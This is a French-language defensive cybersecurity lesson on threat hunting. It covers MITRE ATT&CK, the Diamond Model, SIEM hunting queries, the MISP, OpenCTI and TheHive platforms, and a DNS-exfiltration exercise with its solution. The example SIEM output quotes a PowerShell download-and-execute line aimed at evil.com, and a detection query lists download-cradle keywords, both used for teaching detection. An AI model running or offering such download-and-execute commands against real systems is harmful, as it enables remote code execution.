---
tags:
  - Cybersécurité
  - Avancé
  - Concept
description: "Threat hunting hypothèse-driven, MITRE ATT&CK, Diamond Model, threat intelligence, MISP, OpenCTI"
estimated_time: "50 min"
fiche_number: 3
total_fiches: 5
cursus: "Phase 5 - Spécialisation Défensive"
id: "security.cybersecurity.defensive.threat-hunting-intelligence"
course_id: "security.cybersecurity"
module_id: "security.cybersecurity.defensive"
content_type: "lesson"
order: 3
---

# 03 - Threat Hunting et Intelligence

> **En bref** : À la fin de cette fiche, tu sauras mener une campagne de threat hunting basée sur des hypothèses MITRE ATT&CK, utiliser les modèles d'analyse (Diamond Model, Cyber Kill Chain), exploiter les plateformes de threat intelligence (MISP, OpenCTI, TheHive) et distinguer les IoCs des IoAs pour une détection proactive. Lecture estimée : 50 min.


## Prérequis

- [Phase 5 - fiche 01 (Détection et Réponse aux Incidents)](01-detection-reponse-incidents.md) complétée
- [Phase 5 - fiche 02 (Analyse de Malware)](02-analyse-malware.md) complétée
- [Phase 3 - fiche 04 (Détection et Monitoring)](../03-competences-intermediaires/04-introduction-soc-monitoring.md) complétée
- Connaissances de base en SIEM (requêtes, corrélation de logs)
- Familiarité avec les Event Logs Windows et les logs Linux

## Objectif de cette fiche

À la fin de cette fiche, tu sauras mener une campagne de threat hunting basée sur des hypothèses MITRE ATT&CK, utiliser les modèles d'analyse (Diamond Model, Cyber Kill Chain), exploiter les plateformes de threat intelligence (MISP, OpenCTI, TheHive) et distinguer les IoCs des IoAs pour une détection proactive.

---

## Concepts

### Qu'est-ce que le Threat Hunting ?

**Définition** : Le threat hunting est la recherche proactive et itérative de menaces qui ont échappé aux systèmes de détection automatiques (SIEM, IDS, EDR). Contrairement à la réponse aux incidents (réactive), le threat hunting part d'une hypothèse et cherche activement des preuves de compromission.

**Le problème que le threat hunting résout** :

Sans threat hunting, voici les problèmes rencontrés :

1. **Détections manquées** : les alertes automatiques ne couvrent que les menaces connues. Les attaques nouvelles ou sophistiquées passent entre les mailles
2. **Temps de détection excessif** : sans recherche proactive, une intrusion reste non détectée pendant des semaines ou des mois
3. **Faux sentiment de sécurité** : l'absence d'alertes ne signifie pas l'absence de compromission
4. **Règles obsolètes** : les règles de détection ne sont pas mises à jour pour couvrir les nouvelles techniques d'attaque

**Comment le threat hunting résout ces problèmes** :

| Problème | Solution apportée par le threat hunting |
| -------- | --------------------------------------- |
| Détections manquées | Recherche basée sur des hypothèses, pas sur des signatures |
| Temps de détection excessif | Chasse proactive qui raccourcit le dwell time |
| Faux sentiment de sécurité | Vérification active que les systèmes ne sont pas compromis |
| Règles obsolètes | Chaque hunt produit de nouvelles règles de détection |

**Analogie concrète** : Les systèmes de détection automatiques sont comme les alarmes d'une maison : elles se déclenchent quand quelqu'un force une porte ou une fenêtre. Le threat hunting est comme un gardien qui fait des rondes régulières à l'intérieur de la maison, en vérifiant les placards, le grenier et la cave, parce qu'un intrus habile aurait pu entrer sans déclencher l'alarme.

**Ce que le threat hunting n'est PAS** :

- Le threat hunting n'est pas de la réponse aux incidents. La réponse aux incidents réagit à une alerte. Le threat hunting cherche des menaces _sans alerte préalable_
- Le threat hunting n'est pas du monitoring passif. Le monitoring attend les événements. Le threat hunting formule des hypothèses et cherche activement des preuves

### Qu'est-ce que le framework MITRE ATT&CK ?

**Définition** : MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) est une base de connaissances publique qui catalogue les tactiques et techniques utilisées par les attaquants dans le monde réel. Chaque technique est documentée avec des exemples, des procédures de détection et des groupes d'attaquants associés.

**Le problème que MITRE ATT&CK résout** :

Sans MITRE ATT&CK, voici les problèmes rencontrés :

1. **Vocabulaire incohérent** : chaque équipe utilise des termes différents pour décrire les mêmes techniques d'attaque
2. **Couverture de détection inconnue** : impossible de savoir quelles techniques sont détectées et lesquelles ne le sont pas
3. **Priorisation difficile** : sans référentiel, on ne sait pas quelles techniques cibler en priorité

**Comment MITRE ATT&CK résout ces problèmes** :

| Problème | Solution apportée |
| -------- | ----------------- |
| Vocabulaire incohérent | Identifiants uniques (T1059, T1547) et descriptions standardisées |
| Couverture de détection inconnue | Matrice qui permet de mapper les détections existantes |
| Priorisation difficile | Données sur la fréquence d'utilisation par les groupes APT |

**Structure de MITRE ATT&CK** :

| Niveau | Exemple | Description |
| ------ | ------- | ----------- |
| Tactique | Exécution (TA0002) | L'objectif de l'attaquant (le "pourquoi") |
| Technique | Command and Scripting Interpreter (T1059) | La méthode utilisée (le "comment") |
| Sous-technique | PowerShell (T1059.001) | La variante spécifique |
| Procédure | APT29 utilise PowerShell obfusqué | L'implémentation concrète par un groupe |

**Les 15 tactiques MITRE ATT&CK (Enterprise)** :

La matrice Enterprise a 15 tactiques. TA0005 s'appelle **Stealth** (dissimulation, apparence de comportement normal). **Defense Impairment** (TA0112) est une tactique distincte : casser les mécanismes de sécurité, les pipelines et les outils de défense.

| # | Tactique | ID | Objectif |
| - | -------- | -- | -------- |
| 1 | Reconnaissance | TA0043 | Collecter des informations sur la cible |
| 2 | Resource Development | TA0042 | Préparer l'infrastructure d'attaque |
| 3 | Initial Access | TA0001 | Obtenir un premier accès |
| 4 | Exécution | TA0002 | Exécuter du code malveillant |
| 5 | Persistence | TA0003 | Maintenir l'accès |
| 6 | Privilege Escalation | TA0004 | Obtenir des privilèges supérieurs |
| 7 | Stealth | TA0005 | Se cacher et paraître comme un comportement normal |
| 8 | Defense Impairment | TA0112 | Casser les mécanismes de sécurité et les outils de défense |
| 9 | Credential Access | TA0006 | Voler des identifiants |
| 10 | Discovery | TA0007 | Explorer l'environnement |
| 11 | Lateral Movement | TA0008 | Se déplacer dans le réseau |
| 12 | Collection | TA0009 | Rassembler les données ciblées |
| 13 | Command and Control | TA0011 | Communiquer avec les systèmes compromis |
| 14 | Exfiltration | TA0010 | Extraire les données |
| 15 | Impact | TA0040 | Détruire, chiffrer ou manipuler |

### Qu'est-ce que le Diamond Model ?

**Définition** : Le Diamond Model of Intrusion Analysis est un modèle qui décrit chaque événement d'intrusion comme un losange (diamond) reliant quatre éléments : l'adversaire, l'infrastructure, la capacité et la victime.

**Les 4 sommets du Diamond Model** :

| Sommet | Description | Exemple |
| ------ | ----------- | ------- |
| Adversary | L'acteur de la menace | APT28, FIN7, Lazarus Group |
| Infrastructure | Les ressources utilisées par l'adversaire | Domaines C2, serveurs, emails de phishing |
| Capability | Les outils et techniques utilisés | Malware spécifique, exploit, technique MITRE |
| Victim | La cible de l'attaque | Organisation, secteur d'activité, système ciblé |

**Analogie concrète** : Le Diamond Model est comme la fiche d'enquête de police qui relie un suspect (adversaire) à ses outils (capacité), ses véhicules (infrastructure) et sa victime. En connaissant trois éléments, on peut souvent déduire le quatrième.

### Qu'est-ce que la Cyber Kill Chain ?

**Définition** : La Cyber Kill Chain, développée par Lockheed Martin, décrit les 7 étapes qu'un attaquant suit pour mener une attaque réussie. En comprenant ces étapes, le défenseur peut interrompre la chaîne à n'importe quel point.

**Les 7 étapes de la Cyber Kill Chain** :

| Étape | Nom | Description | Exemple de détection |
| ----- | --- | ----------- | -------------------- |
| 1 | Reconnaissance | Recherche d'informations sur la cible | Monitoring des scans, OSINT défensif |
| 2 | Weaponization | Création du payload malveillant | Non observable directement |
| 3 | Delivery | Livraison du payload (email, web, USB) | Filtrage email, proxy web |
| 4 | Exploitation | Exploitation d'une vulnérabilité | Patching, détection d'exploits |
| 5 | Installation | Installation du malware/backdoor | EDR, monitoring fichiers |
| 6 | Command & Control | Communication avec l'attaquant | Monitoring réseau, DNS |
| 7 | Actions on Objectives | Réalisation de l'objectif (vol, destruction) | DLP, monitoring données |

**Comparaison Cyber Kill Chain vs MITRE ATT&CK** :

| Cyber Kill Chain | MITRE ATT&CK |
| ---------------- | ------------- |
| 7 étapes linéaires | 15 tactiques non linéaires |
| Vue séquentielle de l'attaque | Vue matricielle des techniques |
| Orientée prévention (rompre la chaîne) | Orientée détection (mapper les techniques) |
| Moins détaillée | Très détaillée (sous-techniques, procédures) |
| Adaptée au reporting exécutif | Adaptée au travail technique quotidien |

### Qu'est-ce que la différence entre IoC et IoA ?

**Définition** :

- **IoC (Indicator of Compromise)** : preuve technique qu'une compromission a eu lieu. Exemples : hash de malware, adresse IP de C2, domaine malveillant
- **IoA (Indicator of Attack)** : comportement suspect qui indique qu'une attaque est _en cours_, même sans malware connu. Exemples : PowerShell téléchargeant un fichier, processus enfant inhabituel, mouvement latéral

**Comparaison IoC vs IoA** :

| IoC | IoA |
| --- | --- |
| Réactif (après compromission) | Proactif (pendant l'attaque) |
| Basé sur des signatures (hashes, IPs) | Basé sur des comportements |
| Facile à changer pour l'attaquant | Difficile à changer (les comportements persistent) |
| Détecte les menaces connues | Détecte les menaces inconnues |
| Exemples : hash, IP, domaine, mutex | Exemples : parent-enfant suspect, élévation de privilèges anormale |

---

## Étapes Pratiques

### Étape 1 : Formuler une hypothèse de threat hunting

Le threat hunting commence toujours par une hypothèse. Une bonne hypothèse est spécifique, testable et basée sur le framework MITRE ATT&CK.

```bash
# Exemple d'hypothèse structurée :

# Hypothèse : "Un attaquant utilise PowerShell pour télécharger et exécuter
# un payload depuis Internet (MITRE T1059.001 + T1105)"

# Justification : PowerShell est le vecteur d'exécution le plus courant
# selon les rapports de threat intelligence récents.

# Source de données : Event Logs Windows (Event ID 4104 - Script Block Logging)

# Critères de succès : Identifier les scripts PowerShell qui :
# 1. Utilisent Invoke-WebRequest, wget, curl, Net.WebClient
# 2. Téléchargent des fichiers depuis des URLs externes
# 3. Exécutent le fichier téléchargé via IEX ou Start-Process

# Requête SIEM (exemple Splunk) :
# index=windows sourcetype=WinEventLog:Microsoft-Windows-PowerShell/Operational
# EventCode=4104
# | search ScriptBlockText="*Invoke-WebRequest*" OR
#          ScriptBlockText="*Net.WebClient*" OR
#          ScriptBlockText="*DownloadString*" OR
#          ScriptBlockText="*DownloadFile*"
# | stats count by ComputerName, ScriptBlockText
```

**Résultat attendu** :

```text
# Résultats de la requête
ComputerName     ScriptBlockText                                          count
DESKTOP-ADMIN01  Invoke-WebRequest -Uri http://evil.com/p.ps1 | IEX     1
SRV-WEB-02       (New-Object Net.WebClient).DownloadFile("http://...")    3
```

### Étape 2 : Techniques de hunting - Stack Counting

Le stack counting consiste à compter les occurrences de chaque valeur dans un champ. Les valeurs rares (long tail) sont potentiellement suspectes.

```bash
# Stack counting sur les processus parents de cmd.exe
# Hypothèse : un processus inhabituel lance cmd.exe

# Requête Splunk
# index=windows sourcetype=WinEventLog:Security EventCode=4688
# New_Process_Name="*\\cmd.exe"
# | stats count by Creator_Process_Name
# | sort count

# Requête Elastic/KQL
# process.name: "cmd.exe" AND event.code: "1"
# | stats count by process.parent.name
# | sort count asc

# Interprétation :
# explorer.exe      → 1523 occurrences → normal (utilisateur ouvre CMD)
# svchost.exe       → 2 occurrences → SUSPECT (svchost ne lance pas CMD)
# wmiprvse.exe      → 1 occurrence  → SUSPECT (exécution WMI distante)
```

**Résultat attendu** :

```text
Creator_Process_Name        count
svchost.exe                 2
wmiprvse.exe                1
services.exe                3
cmd.exe                     45
explorer.exe                1523
```

### Étape 3 : Techniques de hunting - Long-Tail Analysis

La long-tail analysis identifie les événements rares qui se cachent dans le bruit. On cherche les valeurs qui apparaissent 1 ou 2 fois parmi des milliers.

```bash
# Long-tail analysis sur les connexions réseau sortantes
# Hypothèse : un C2 communique avec un domaine rarement contacté

# Requête Splunk
# index=network sourcetype=dns
# | stats count by query
# | where count < 5
# | sort count

# Résultat typique :
# google.com           → 45000 requêtes → normal
# microsoft.com        → 23000 requêtes → normal
# aGVsbG8.evil.com     → 3 requêtes → SUSPECT (sous-domaine encodé Base64)
# update-srv.xyz       → 1 requête  → SUSPECT (domaine récent, TLD suspect)

# Enrichir les résultats suspects
# Vérifier l'âge du domaine (whois)
# Vérifier la réputation (VirusTotal, AbuseIPDB)
# Vérifier si le domaine est un DGA (Domain Generation Algorithm)
```

**Résultat attendu** :

```text
query                           count
aGVsbG8.evil.com               3
update-srv.xyz                  1
cdn-static-res.top              2
legitimate-company.com          15234
```

### Étape 4 : Techniques de hunting - Anomaly Détection

L'anomaly détection identifie les écarts par rapport au comportement habituel (baseline).

```bash
# Anomaly detection sur les heures de connexion
# Hypothèse : un attaquant se connecte en dehors des heures de bureau

# Requête Splunk
# index=windows sourcetype=WinEventLog:Security EventCode=4624 Logon_Type=10
# | eval hour=strftime(_time, "%H")
# | stats count by Account_Name, hour
# | where hour < 6 OR hour > 22

# Anomaly detection sur le volume de données sortantes
# Hypothèse : exfiltration de données en dehors des heures normales

# Requête Splunk
# index=network sourcetype=firewall action=allowed direction=outbound
# | bin _time span=1h
# | stats sum(bytes_out) as total_bytes by src_ip, _time
# | where total_bytes > 1000000000
# | sort - total_bytes

# Anomaly detection sur les processus
# Hypothèse : un processus légitime est usurpé (process masquerading)

# Vérification : svchost.exe doit TOUJOURS être lancé depuis
# C:\Windows\System32\svchost.exe
# Un svchost.exe lancé depuis C:\Temp\ est malveillant

# Requête
# index=windows sourcetype=Sysmon EventCode=1
# process_name="svchost.exe"
# NOT process_path="C:\\Windows\\System32\\svchost.exe"
```

**Résultat attendu** :

```text
# Connexions suspectes hors horaires
Account_Name     hour    count
admin_backup     03      7
svc_deploy       23      12

# Volume de données suspect
src_ip           _time              total_bytes
192.168.1.45     2026-03-19 02:00   5368709120

# Processus masqué
process_name    process_path                      parent
svchost.exe     C:\Users\Public\svchost.exe       explorer.exe
```

### Étape 5 : Utiliser MISP pour la threat intelligence

MISP (Malware Information Sharing Platform) est une plateforme open source de partage d'indicateurs de compromission.

```bash
# Installer MISP (via Docker)
git clone https://github.com/MISP/misp-docker.git
cd misp-docker
cp template.env .env
# Éditer .env pour configurer les mots de passe
docker compose up -d

# Accéder à l'interface web
# URL : https://localhost:443
# Login par défaut : admin@admin.test / admin

# Utiliser l'API MISP avec Python (PyMISP)
pip3 install pymisp
```

```python
# Script Python pour interroger MISP
from pymisp import PyMISP

# Connexion à l'instance MISP
misp = PyMISP(
    url="https://localhost",
    key="YOUR_API_KEY",
    ssl=False  # En lab uniquement
)

# Rechercher un IoC (adresse IP)
result = misp.search(
    controller="attributes",
    value="185.220.101.45",
    type_attribute="ip-dst"
)

# Afficher les événements associés
for attribute in result["Attribute"]:
    event_id = attribute["event_id"]
    print(f"Event #{event_id}: {attribute['value']} "
          f"(type: {attribute['type']}, "
          f"category: {attribute['category']})")

# Ajouter un nouvel événement avec des IoCs
event = misp.new_event(
    distribution=0,  # Organisation uniquement
    info="INC-2026-0042 - RAT GatePhp",
    threat_level_id=2,  # Medium
    analysis=1  # Ongoing
)

# Ajouter des attributs (IoCs)
misp.add_attribute(event, {
    "type": "ip-dst",
    "value": "185.220.101.45",
    "category": "Network activity",
    "to_ids": True
})

misp.add_attribute(event, {
    "type": "sha256",
    "value": "a1b2c3d4e5f6...",
    "category": "Payload delivery",
    "to_ids": True
})
```

**Résultat attendu** :

```text
Event #1234: 185.220.101.45 (type: ip-dst, category: Network activity)
  → Associé au groupe APT-XX, campagne active depuis janvier 2026
  → Tags: tlp:amber, apt-xx, rat, gate-php
```

### Étape 6 : Utiliser OpenCTI pour la corrélation

OpenCTI est une plateforme open source de Cyber Threat Intelligence qui structure et corrèle les informations sur les menaces en utilisant le standard STIX.

```bash
# Installer OpenCTI (via Docker)
git clone https://github.com/OpenCTI-Platform/docker.git opencti-docker
cd opencti-docker
cp .env.sample .env
# Éditer .env : configurer OPENCTI_ADMIN_PASSWORD, OPENCTI_ADMIN_TOKEN

docker compose up -d

# Accéder à l'interface
# URL : http://localhost:8080
# Login : admin@opencti.io / [mot de passe configuré]

# Connecteurs utiles à activer :
# - MITRE ATT&CK (importe la matrice complète)
# - AlienVault OTX (feeds d'IoCs gratuits)
# - Abuse.ch (URLhaus, MalwareBazaar)
# - MISP (synchronisation bidirectionnelle)
```

**Résultat attendu** :

```text
# Dans OpenCTI, après import des données :
# - L'IP 185.220.101.45 est liée à 3 rapports de threat intelligence
# - Le malware gate.php est associé au groupe Intrusion Set "APT-XX"
# - Les techniques MITRE identifiées : T1059.001, T1547.001, T1071.001
# - Relation : APT-XX → uses → GatePhp RAT → targets → Secteur finance
```

### Étape 7 : Utiliser TheHive pour le case management

TheHive est une plateforme de gestion des incidents qui permet de suivre les cas, les tâches et les observables.

```bash
# Installer TheHive 5 (via Docker)
git clone https://github.com/StrangeBeeCorp/docker.git thehive-docker
cd thehive-docker
docker compose up -d

# Accéder à l'interface
# URL : http://localhost:9000
# Login : admin@thehive.local / secret

# Créer un cas via l'API
curl -X POST http://localhost:9000/api/v1/case \
  -H "Authorization: Bearer YOUR_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "title": "INC-2026-0042 - RAT détecté sur PROD-WEB-01",
    "description": "RAT communiquant avec 185.220.101.45 via gate.php",
    "severity": 3,
    "tlp": 2,
    "tags": ["rat", "c2", "apt-xx"]
  }'
```

**Résultat attendu** :

```json
{
  "_id": "~41943040",
  "title": "INC-2026-0042 - RAT détecté sur PROD-WEB-01",
  "severity": 3,
  "status": "New",
  "createdAt": 1742342400000
}
```

### Étape 8 : Mapper les résultats sur MITRE ATT&CK

Après chaque hunt, mapper les techniques observées sur la matrice MITRE ATT&CK pour mesurer la couverture de détection.

```bash
# Résultats du hunt mappés sur MITRE ATT&CK

# Technique observée → Règle de détection créée

# T1059.001 (PowerShell)
# → Règle : Alerte sur Event ID 4104 avec Invoke-WebRequest/DownloadString
# → Statut : Détecté

# T1547.001 (Registry Run Keys)
# → Règle : Alerte sur modification de CurrentVersion\Run
# → Statut : Détecté

# T1071.001 (Web Protocols - HTTP C2)
# → Règle : Alerte sur beaconing régulier vers IPs externes
# → Statut : Détecté

# T1036.005 (Match Legitimate Name - Process Masquerading)
# → Règle : Alerte sur svchost.exe hors de System32
# → Statut : Détecté

# T1003.001 (OS Credential Dumping: LSASS Memory)
# → Règle : ???
# → Statut : NON COUVERT → à ajouter en priorité
```

**Résultat attendu** :

```text
# Matrice de couverture après le hunt :
Tactique              Techniques couvertes / Total    Couverture
Initial Access        2 / 11                          18%
Execution             3 / 20                          15%
Persistence           4 / 22                          18%
Stealth               2 / 30                          7%    ← PRIORITÉ
Defense Impairment    0 / 18                          0%    ← PRIORITÉ
Credential Access     1 / 17                          6%    ← PRIORITÉ
Lateral Movement      1 / 9                           11%
C2                    3 / 18                          17%
```

---

## Commandes Utiles

| Commande | Action |
| -------- | ------ |
| `misp-search.py --value "185.220.101.45"` | Chercher un IoC dans MISP |
| `pymisp` (bibliothèque Python) | Interagir avec l'API MISP |
| `curl -X POST http://thehive:9000/api/v1/case` | Créer un cas dans TheHive |
| ATT&CK Navigator (outil web) | Visualiser la couverture de détection sur la matrice |
| `sigma` (outil CLI) | Convertir des règles Sigma en requêtes SIEM |
| `chainsaw` | Scanner les Event Logs Windows avec des règles Sigma |

---

## Pièges Fréquents

### Piège 1 : Formuler des hypothèses trop vagues

**Problème** : L'hypothèse "Un attaquant est peut-être dans notre réseau" est impossible à tester. Elle ne donne aucune direction de recherche concrète.

**Solution** : Formuler des hypothèses spécifiques basées sur MITRE ATT&CK. Exemple : "Un attaquant utilise T1059.001 (PowerShell) pour télécharger un payload (T1105) depuis une IP externe." Cette hypothèse définit la technique, la source de données (Event ID 4104) et les critères de recherche (Invoke-WebRequest, DownloadString).

### Piège 2 : Confondre IoC et IoA

**Problème** : Chercher uniquement des IoCs (hashes, IPs) ne détecte que les menaces déjà connues. Un attaquant qui change d'IP ou recompile son malware échappe à la détection.

**Solution** : Combiner la recherche d'IoCs (détection des menaces connues) avec la recherche d'IoAs (détection des comportements suspects). Les IoAs persistent même quand l'attaquant change ses outils : un process hollowing reste un process hollowing, quelle que soit l'IP du C2.

### Piège 3 : Ne pas documenter les hunts

**Problème** : Sans documentation, les hunts ne sont pas reproductibles. Les requêtes, les résultats et les conclusions sont perdus.

**Solution** : Documenter chaque hunt avec un format structuré : hypothèse, source de données, requête utilisée, résultats, conclusion, nouvelles règles de détection créées. Stocker cette documentation dans un wiki ou dans TheHive.

### Piège 4 : Ignorer les faux positifs lors du stack counting

**Problème** : Le stack counting remonte beaucoup de valeurs rares. L'analyste passe des heures à investiguer des événements légitimes (mises à jour système, scripts d'administration).

**Solution** : Créer une whitelist des processus et comportements légitimes connus dans l'environnement. Enrichir les résultats avec le contexte (quel utilisateur, quel poste, quelle heure). Prioriser les résultats qui combinent plusieurs indicateurs suspects.

---

## Checklist de Validation

- [ ] Je sais formuler une hypothèse de threat hunting basée sur MITRE ATT&CK
- [ ] Je sais expliquer les 15 tactiques de la matrice MITRE ATT&CK Enterprise
- [ ] Je sais utiliser le stack counting pour identifier les valeurs rares
- [ ] Je sais utiliser la long-tail analysis pour détecter les anomalies réseau
- [ ] Je sais expliquer la différence entre IoC et IoA avec des exemples concrets
- [ ] Je sais utiliser le Diamond Model pour structurer une analyse d'intrusion
- [ ] Je sais expliquer les 7 étapes de la Cyber Kill Chain
- [ ] Je sais interagir avec MISP via PyMISP pour chercher et ajouter des IoCs
- [ ] Je sais créer un cas dans TheHive via l'API
- [ ] Je sais mapper les résultats d'un hunt sur la matrice MITRE ATT&CK

---

## Exercice Pratique

**Énoncé** : Ton SIEM remonte une alerte : un volume inhabituel de requêtes DNS vers des sous-domaines aléatoires d'un domaine inconnu (`*.update-cdn.xyz`). Le domaine a été enregistré il y a 2 semaines. Aucun malware connu n'est associé à ce domaine.

Réalise un threat hunt complet :

1. Formule une hypothèse basée sur MITRE ATT&CK
2. Identifie les sources de données nécessaires
3. Écris les requêtes de recherche (format SIEM de ton choix)
4. Analyse les résultats et identifie les postes compromis
5. Mappe les techniques observées sur MITRE ATT&CK
6. Crée les IoCs dans MISP
7. Documente tes findings dans un format structuré

**Indications** :

- Les sous-domaines aléatoires + domaine récent = probable exfiltration DNS (T1048.003) ou C2 via DNS (T1071.004)
- Cherche quels processus génèrent ces requêtes DNS (corrélation Sysmon Event ID 22)
- Vérifie si les sous-domaines sont encodés en Base64 (exfiltration de données)
- Identifie le pattern temporel (beaconing régulier ?)

**Résultat attendu** : Un rapport de hunt complet avec hypothèse, requêtes, résultats, techniques MITRE identifiées et IoCs extraits.

---

## Solution de l'Exercice

> **Note** : Cette section contient la solution complète. Essaie d'abord de résoudre l'exercice par toi-même avant de consulter cette solution.

---

```bash
# Étape 1 : Hypothèse
# "Un attaquant utilise l'exfiltration DNS (T1048.003) ou le C2 via DNS
# (T1071.004) pour communiquer avec un serveur de commande via des
# sous-domaines encodés du domaine update-cdn.xyz"

# Étape 2 : Sources de données
# - Logs DNS (passif DNS ou Sysmon Event ID 22)
# - Logs proxy (corrélation)
# - Sysmon Event ID 1 (création de processus)
# - Logs firewall (trafic UDP/53 et TCP/53)

# Étape 3 : Requêtes
# Requête 1 : Identifier tous les postes qui contactent le domaine
# index=dns query="*update-cdn.xyz"
# | stats count dc(query) as unique_subdomains by src_ip
# | sort - unique_subdomains

# Résultat :
# src_ip           count    unique_subdomains
# 192.168.1.45     847      312
# 192.168.1.102    523      198

# Requête 2 : Identifier le processus responsable (Sysmon)
# index=sysmon EventCode=22 QueryName="*update-cdn.xyz"
# | stats count by Computer, Image, QueryName

# Résultat :
# Computer          Image                              count
# DESKTOP-SALES01   C:\Users\Public\svchost.exe        847
# DESKTOP-HR02      C:\Users\Public\svchost.exe        523

# Requête 3 : Pattern temporel (beaconing)
# index=dns query="*update-cdn.xyz" src_ip="192.168.1.45"
# | sort _time
# | delta _time as interval
# | stats avg(interval) stdev(interval)

# Résultat : avg=30.02s, stdev=0.15s → beaconing très régulier (30s)

# Étape 4 : Analyse
# - 2 postes compromis : DESKTOP-SALES01 et DESKTOP-HR02
# - Processus : faux svchost.exe dans C:\Users\Public\ (masquerading)
# - Beaconing régulier toutes les 30 secondes
# - Les sous-domaines sont encodés en Base64 → exfiltration de données

# Étape 5 : Mapping MITRE ATT&CK
# T1071.004 - Application Layer Protocol: DNS (C2 via DNS)
# T1048.003 - Exfiltration Over Alternative Protocol: DNS
# T1036.005 - Masquerading: Match Legitimate Name (faux svchost.exe)
# T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys (persistance)

# Étape 6 : IoCs pour MISP
# Domaine : update-cdn.xyz
# IP : [résoudre le domaine]
# Fichier : C:\Users\Public\svchost.exe (hash SHA-256)
# Registre : HKCU\...\Run\WindowsUpdate
# Pattern DNS : sous-domaines Base64 de update-cdn.xyz
```

**Rapport de hunt** :

```text
=== RAPPORT DE THREAT HUNT ===

Hunt ID: TH-2026-0015
Date: 2026-03-19
Analyste: [Nom]

HYPOTHÈSE:
Exfiltration DNS via sous-domaines encodés vers update-cdn.xyz

RÉSULTATS:
- 2 postes compromis identifiés (DESKTOP-SALES01, DESKTOP-HR02)
- Malware : faux svchost.exe (process masquerading)
- Communication : C2 via DNS avec beaconing 30s
- Exfiltration : données encodées en Base64 dans les sous-domaines

TECHNIQUES MITRE ATT&CK:
- T1071.004, T1048.003, T1036.005, T1547.001

ACTIONS:
- Isoler les 2 postes (containment)
- Bloquer update-cdn.xyz au niveau DNS
- Scanner tous les postes pour C:\Users\Public\svchost.exe
- Créer règle de détection pour le beaconing DNS

NOUVELLES RÈGLES CRÉÉES:
- Alerte DNS : sous-domaines > 20 caractères vers domaine < 30 jours
- Alerte Sysmon : svchost.exe hors de System32
```

---

## Navigation

← Fiche précédente : **[02 - Analyse de Malware](02-analyse-malware.md)**

→ Fiche suivante : **[04 - Sécurité du Endpoint (EDR/XDR)](04-securite-endpoint.md)**
